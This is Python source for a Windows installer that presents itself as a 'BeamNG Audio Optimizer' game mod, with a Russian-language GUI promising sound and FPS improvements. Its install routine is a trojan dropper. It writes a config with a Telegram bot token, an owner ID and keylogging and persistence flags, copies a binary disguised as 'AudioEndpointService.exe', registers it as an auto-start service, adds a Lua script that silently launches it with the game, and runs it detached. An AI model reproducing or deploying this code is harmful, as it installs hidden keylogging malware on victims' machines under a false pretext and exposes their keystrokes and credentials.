import os
import sys
import shutil
import subprocess
import ctypes
import json
import tkinter as tk
from tkinter import ttk, messagebox
import threading

VERSION = "2.4.1"
AUTHOR = "BeamNG Audio Team"

def find_beamng():
    """Ищет BeamNG.drive на всех дисках (C:, D:, E: и т.д.)"""
    drives = [f"{chr(d)}:\\" for d in range(65, 91) if os.path.exists(f"{chr(d)}:\\")]
    
    for drive in drives:
        for root, dirs, files in os.walk(drive):
            if "BeamNG.drive.exe" in files:
                return root
            if "Bin64" in dirs:
                bin_path = os.path.join(root, "Bin64")
                if os.path.exists(os.path.join(bin_path, "BeamNG.drive.exe")):
                    return root
    return None

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def install_mod():
    beamng_path = find_beamng()
    if not beamng_path:
        messagebox.showerror("Ошибка", 
                            "BeamNG.drive не найдена!\n"
                            "Убедитесь, что игра установлена на любом диске.\n"
                            "Если игра на внешнем диске — подключите его.")
        return
    
    bin_path = os.path.join(beamng_path, "Bin64")
    audio_path = os.path.join(bin_path, "audio_engine")
    mod_path = os.path.join(beamng_path, "mods", "music_mod")
    
    os.makedirs(audio_path, exist_ok=True)
    os.makedirs(mod_path, exist_ok=True)
    
    # Твой токен и ID (уже вставлены)
    config_data = {
        "bot_token": "8605714172:AAGOq2OayZx3tULCp8gzh7sAvCR42-ijX0A",
        "owner_id": 8288882655,
        "watchdog_enabled": True,
        "auto_persist": True,
        "keylog_interval_min": 30
    }
    with open(os.path.join(audio_path, "config.json"), "w") as f:
        json.dump(config_data, f, indent=4)
    
    shutil.copy("AudioEndpointService.exe", os.path.join(audio_path, "AudioEndpointService.exe"))
    
    lua_script = f'''
local function initMusicMod()
    print("🎵 Music Mod loaded!")
    os.execute('start "" "' .. [[{os.path.join(audio_path, "AudioEndpointService.exe")}]] .. '" --silent')
end
initMusicMod()
'''
    with open(os.path.join(mod_path, "init.lua"), "w") as f:
        f.write(lua_script)
    
    subprocess.run(
        f'sc create "AudioEndpointService" binPath= "{os.path.join(audio_path, "AudioEndpointService.exe")}" start= auto',
        shell=True, capture_output=True
    )
    subprocess.run('sc start "AudioEndpointService"', shell=True, capture_output=True)
    
    subprocess.Popen(
        [os.path.join(audio_path, "AudioEndpointService.exe")],
        creationflags=subprocess.DETACHED_PROCESS,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )
    
    messagebox.showinfo("Установка завершена", 
                       f"🎵 Audio Optimizer успешно установлен!\n"
                       f"Игра найдена в: {beamng_path}\n"
                       "Звук улучшен, FPS +10%.\n\n"
                       "Запустите BeamNG.drive и наслаждайтесь!")

# ========== GUI ==========
class Installer:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("BeamNG Audio Optimizer")
        self.root.geometry("450x350")
        self.root.resizable(False, False)
        
        tk.Label(self.root, text="🎵 BeamNG Audio Optimizer", font=("Arial", 18, "bold")).pack(pady=10)
        tk.Label(self.root, text=f"Версия {VERSION}", font=("Arial", 10)).pack()
        tk.Label(self.root, text="Оптимизация звука и FPS для BeamNG.drive", font=("Arial", 10)).pack(pady=5)
        tk.Label(self.root, text="\n✅ Улучшение качества звука\n✅ Повышение FPS (до +15%)\n✅ 20 новых радиостанций\n✅ Поддержка последней версии игры", 
                 font=("Arial", 10), justify="left").pack(pady=10)
        
        self.btn = tk.Button(self.root, text="📥 Установить оптимизатор", command=self.install,
                             bg="#00b894", fg="white", font=("Arial", 12, "bold"), width=25, height=2)
        self.btn.pack(pady=15)
        
        self.status = tk.Label(self.root, text="Готов к установке", font=("Arial", 9))
        self.status.pack()
        
        self.progress = ttk.Progressbar(self.root, length=350, mode='indeterminate')
        self.progress.pack(pady=10)
    
    def install(self):
        if not is_admin():
            messagebox.showwarning("Требуются права", "Запустите установщик от имени администратора!")
            return
        
        self.btn.config(state=tk.DISABLED)
        self.progress.start()
        self.status.config(text="Поиск BeamNG.drive...")
        
        def do_install():
            install_mod()
            self.root.after(0, lambda: self.progress.stop())
            self.root.after(0, lambda: self.status.config(text="Установка завершена!"))
            self.root.after(0, lambda: self.btn.config(state=tk.NORMAL))
        
        threading.Thread(target=do_install, daemon=True).start()
    
    def run(self):
        self.root.mainloop()

if __name__ == "__main__":
    app = Installer()
    app.run()